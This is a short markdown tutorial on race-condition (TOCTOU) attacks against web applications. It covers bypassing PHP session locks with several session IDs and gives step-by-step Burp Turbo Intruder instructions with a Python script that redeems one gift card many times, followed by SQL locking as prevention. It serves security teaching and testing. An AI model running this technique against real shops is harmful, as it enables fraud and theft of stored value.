# Race Condition
- [Overview](#overview)
- [Exploitation](#exploitation)


## Overview
- A race condition happens when two or more actions happen at nearly the same time, and the final result depends on which action finishes first. If a program doesn't handle this properly, an attacker can "race" the program and change the result in their favor.

- The TOCTOU Problem (Time of Check to Time of Use)
    - This is a common type of race condition. It means:
        - Time of Check: The program checks if it's safe to do something.
        - Time of Use: The program actually does that thing.
    If there's a time gap between these two steps, an attacker can change things in that gap.


    
## Exploitation
- **PHP Session Files and File Locks**
    - PHP stores sessions in files on the server.
    - When a session is active, PHP locks the session file to prevent simultaneous access.
    - This blocks multiple parallel requests using the same session — they wait for the lock to release.
    - This behavior prevents race condition exploits if all requests share one session.
- Bypass:
    - Use multiple sessions (different session IDs).
    - Each session has its own file, no shared lock.
    - This allows parallel requests, enabling race condition exploitation.


- **Burp Turbo Intruder Exploit**
    - Example:
        - Install Turbo Intruder from Burp Suite > BApp Store.
        - Collect multiple session IDs by sending the login request in Repeater ~5 times. Save the PHPSESSID cookies.
    - Exploit Steps:
        - Buy a gift card & intercept the redeem request — then drop it.
        - Send this redeem request to Turbo Intruder.
    - In Turbo Intruder:
        - Replace the session ID with %s in the Cookie header:
        Cookie: PHPSESSID=%s
        Select or paste the [race.py](https://raw.githubusercontent.com/PortSwigger/turbo-intruder/b5c6e2d614cf8db0e9b02a32dd06119161888e17/resources/examples/race.py) script from Turbo Intruder's GitHub.
        - Add your saved session IDs in the script as payloads.
        ```python
            def queueRequests(target, wordlists):
            engine = RequestEngine(endpoint=target.endpoint,
                                concurrentConnections=30,
                                requestsPerConnection=100,
                                pipeline=False
                                )

            # the 'gate' argument blocks the final byte of each request until openGate is invoked
            for sess in ["p5b2nr48govua1ieljfdecppjg", "48ncr9hc1rjm361fp7h17110ar", "0411kdhfmca5uqiappmc3trgcg", "m3qv0d1qu7omrtm2rooivr7lc4", "onerh3j83jopd5ul8scjaf14rr"]:
                engine.queue(target.req, sess, gate='race1')

            # wait until every 'race1' tagged request is ready
            # then send the final byte of each request
            # (this method is non-blocking, just like queue)
            engine.openGate('race1')

            engine.complete(timeout=60)


            def handleResponse(req, interesting):
                table.add(req)
        ```
    - Start the attack by clicking Attack.
        - If successful, the gift card is redeemed multiple times, increasing your balance.

## Prevention
- Use SQL WRITE locks to prevent simultaneous database access:
```SQL
LOCK TABLES active_gift_cards WRITE, users WRITE;
```
- After processing, release with:
`UNLOCK TABLES;`
- This blocks multiple threads from updating the same data at once, preventing the race condition.
